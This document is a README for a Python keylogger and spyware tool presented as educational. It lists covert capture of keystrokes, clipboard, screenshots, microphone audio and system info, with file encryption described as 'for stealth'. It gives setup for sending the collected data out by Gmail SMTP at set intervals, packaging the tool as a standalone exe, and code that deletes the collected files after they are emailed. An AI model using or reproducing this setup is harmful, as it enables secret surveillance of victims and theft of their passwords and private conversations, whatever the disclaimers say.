# Security Education Tool

**IMPORTANT**: This tool is developed SOLELY for educational purposes in cybersecurity training and authorized penetration testing.

## Ethical Guidelines

- Only use on systems you own or have EXPLICIT permission to test
- Never deploy on production systems without written authorization
- All data collected must be properly secured and destroyed after analysis
- Document all testing activities

## Legal Notice

Unauthorized use of this tool may violate computer crime laws, privacy laws, and other regulations.

# 🛡️ Advanced Keylogger & Spyware Simulation Tool

> ⚠️ **Educational Use Only** — This tool is designed strictly for cybersecurity education and awareness.
> Use only on systems **you own** or have **explicit permission** to test. Unauthorized use is illegal.

---

## 📌 Overview

This Python-based tool simulates a real-world spyware/keylogger scenario for **educational and research purposes**. It demonstrates how attackers might collect sensitive data such as keystrokes, clipboard content, system info, screenshots, microphone/system audio, and send them via email — all while applying file encryption for stealth.

---

## 🎯 Features

- 🔑 **Keylogger** — Records all keystrokes.
- 📋 **Clipboard Monitor** — Logs clipboard changes (text only).
- 📸 **Screenshot Recorder** — Captures screen at configurable intervals.
- 🔊 **Audio Recorder** — Records microphone or system audio.
- 🧠 **System Info Collector** — Gathers device/OS/hostname/network info.
- 🔐 **AES File Encryption** — Secures output files with a generated key.
- 📬 **Email Reporting** — Sends collected data as encrypted attachments.
- 🗑️ **Auto Cleanup** — Deletes the output directory after email is sent.
- 💻 **Standalone EXE Support** — Fully packaged with PyInstaller.

---

## ⚙️ Setup

### 🔧 Install Dependencies

```bash
pip install -r requirements.txt
```

Required libraries: pynput, pyperclip, pyautogui, pyaudio, cryptography, smtplib, etc.

## 📧 Email Reporting Configuration

This tool supports **automated email reporting**. After collecting and optionally encrypting data, it can send the output files as an email attachment to a specified address.

### 🔐 Why Not Hardcode Credentials?

⚠️ **NEVER hardcode email credentials directly in the Python files** or compile them into the `.exe`. Doing so can expose your password via reverse engineering tools.
Instead, the tool uses a separate configuration file: `config.json`.

---

### 📁 Step-by-Step Setup

1. **Enable 2FA and App Password (Gmail)**
   - Go to [https://myaccount.google.com/security](https://myaccount.google.com/security)
   - Enable **2-Step Verification**
   - Scroll to "App Passwords"
   - Generate a new app password for **Mail** and copy it

2. **Create a `config.json` file**
   Create a file named `config.json` in the same directory as your `.exe` or `main.py`.

```json
{
  "smtp_server": "smtp.gmail.com",
  "smtp_port": 587,
  "sender_email": "your_email@gmail.com",
  "sender_password": "your_app_password",
  "recipient_email": "receiver_email@gmail.com",
  "interval": 60
}
```

interval is the time in seconds between periodic reports (e.g., 60 = send every minute).

You can leave interval high (e.g., 9999) if you only want final email reporting.

Running the tool with email enabled

```bash
python main.py --duration 60 --email
```

Or for .exe:

```bash
your_tool.exe --duration 60 --email
```

Make sure config.json is in the same folder as the .exe.

💡 Security Tip
Do NOT upload your config.json to GitHub.

Add it to .gitignore:

```arduino
config.json
```

If sharing the project, provide a sample template instead:

```json
{
  "smtp_server": "smtp.gmail.com",
  "smtp_port": 587,
  "sender_email": "your_email@gmail.com",
  "sender_password": "your_app_password",
  "recipient_email": "receiver_email@gmail.com",
  "interval": 60
}
```

🗑️ Optional: Delete Output After Email Sent
If you want to automatically delete the collected data after successful email reporting:

Make sure email is enabled and successfully configured.

At the end of main.py, after final reporting, call:

```python
import shutil
shutil.rmtree(output_dir)
```

Example:
```python
if args.email and reporter and reporter.configured:
    print("Sending final email report...")
    reporter.send_report(output_dir)
    # ✅ Delete output folder after sending
    shutil.rmtree(output_dir)
```

✅ Summary
Use config.json to safely store credentials.

Keep credentials outside the compiled .exe.

Avoid GitHub leaks: .gitignore your config.json.

Automate secure reporting + cleanup with ease.
